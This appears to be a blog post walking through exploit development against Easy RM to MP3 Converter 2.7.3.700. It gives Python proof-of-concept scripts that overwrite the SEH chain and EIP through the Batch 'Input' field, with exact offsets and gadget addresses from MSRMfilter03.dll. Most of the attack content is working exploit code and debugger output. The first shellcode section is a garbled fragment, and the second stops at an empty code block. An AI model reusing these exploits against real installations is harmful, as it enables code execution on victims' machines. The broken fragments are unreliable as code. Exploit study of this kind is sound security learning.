# Preamble
After finishing with the [previous](https://whitecr0wz.github.io/posts/Easy-RM-to-MP3-Converter/) vulnerability, i was eager to find out if i could exploit another vulnerable function within this program, which brought us to this post.

# The Bug

Easy RM to MP3 Converter 2.7.3.700 suffers from a vulerability in which it is possible to trigger a Buffer Overflow or a Structured Exception Handling Overwrite when specifying a long string within the parameter "Input" in the "Batch" section.

A small fuzzing script is generated:

```term_session
import struct

buffer = "A" * 50000

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```

After this script is run, its contents are copied into the clipboard with Notepad++:

![](/assets/img/Findings3/0.png)

Once this is copied and the application is started, select "Cancel":

![](/assets/img/Findings3/1.png)

The section "Batch" is chosen:

![](/assets/img/Findings3/2.png)

In the parameter "Input", delete everything and paste the contents of the generated file:

![](/assets/img/Findings3/3.png)

![](/assets/img/Findings3/4.png)

A message box may appear, click OK:

![](/assets/img/Findings3/5.png)

Once this is done, the SEH Chain is overwritten:

![](/assets/img/Findings3/6.png)

A pattern is generated:

```term_session
root@kali:~# msf-pattern_create -l 50000 > pattern 
root@kali:~# 
```

After the process is repeated (changing the A's for the pattern), the SEH Chain is overwritten by the pattern:

![](/assets/img/Findings3/7.png)

The nSEH value is copied and the offset is found using msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 336F4C32 -l 50000 
[*] Exact match at offset 9008
[*] Exact match at offset 29288
[*] Exact match at offset 49568
root@kali:~#
```

## Hijacking the power

Updated PoC:

```term_session
import struct

buffer = "A" * 9008 + "BBBB" + "CCCC"

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```

When the aforementioned process is yet repeated, an additional messagebox appears, just click OK:

![](/assets/img/Findings3/8.png)

The SEH Chain is overwritten as desired:

![](/assets/img/Findings3/9.png)

The next step is to find a reliable POP-POP-RETN sequence. 

Listing the modules:

![](/assets/img/Findings3/11.png)

In this case, i chose the module MSRMfilter03.dll, as it has all protections disabled and does not contain a NULL-byte within its base address.

Listing POP-POP-RETN sequences:

![](/assets/img/Findings3/12.png)

The first address was chosen and inserted into the script.

Updated PoC:

```term_session
import struct

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10025A2E) # 0x10025a2e : pop ecx # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, 
Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)

buffer = "A" * 9008 + nseh + seh + "\xff" * 200

f = open ("finding3.txt", "w")
f.write(buffer)
f.close()
```
Succeeding the crash, SHIFT+F9 is pressed, granting execution:

![](/assets/img/Findings3/13.png)

## Shellcode

Some shellcode that spawns calculator is generated:

nseh = struct.pack("<I", 0x06710870)

f.close()
```

# Second Stage

After exploiting this application i thought of exploiting a Vanilla Stack Overflow, as the EIP would get overwritten when performing the SEH exploitation:

![](/assets/img/Findings3/10.png)

As it is already known that it crashes with 9000 bytes, let's create a pattern with such length:

```term_session
root@kali:~# msf-pattern_create -l 9000 > pattern 
root@kali:~# 
```

Following the exploitation, the EIP is overwritten by the pattern:

![](/assets/img/Findings4/0.png)

The offset is found with the use of msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 654C3165 -l 9000 
[*] Exact match at offset 8704
root@kali:~# 
```

Now it is needed to verify whether the control has been achieved or not.

Updated PoC:

```term_session
import struct

buffer = "A" * 8704 + "BBBB" + "\xff" * 200 

f = open ("finding4.txt", "w")
f.write(buffer)
f.close()
```

The process is yet repeated verifying control:

![](/assets/img/Findings4/2.png)

## Hijacking the power

In a Vanilla Buffer Overflow it is needed to use an instruction which will align ESP with EIP, in the majority of the cases being a JMP ESP, or in some cases a CALL ESP. However, in this case none of them were found in the MSRMfilter03.dll module. Despite this obstacle, i was capable of finding a PUSH ESP, RET instruction, which will have the same function as the others:

![](/assets/img/Findings4/3.png)

Updated PoC:

```term_session
import struct

pushesp = struct.pack("<I", 0x1001B058) # 0x1001b058 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, 
SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)

buffer = "A" * 8704 + pushesp + "\xff" * 200 

f = open ("finding4.txt", "w")
f.write(buffer)
f.close()
```

Succeeding the exploitation, the additional bytes are executed:

![](/assets/img/Findings4/4.png)

# Shellcode

The last step is to generate some shellcode:

```term_session
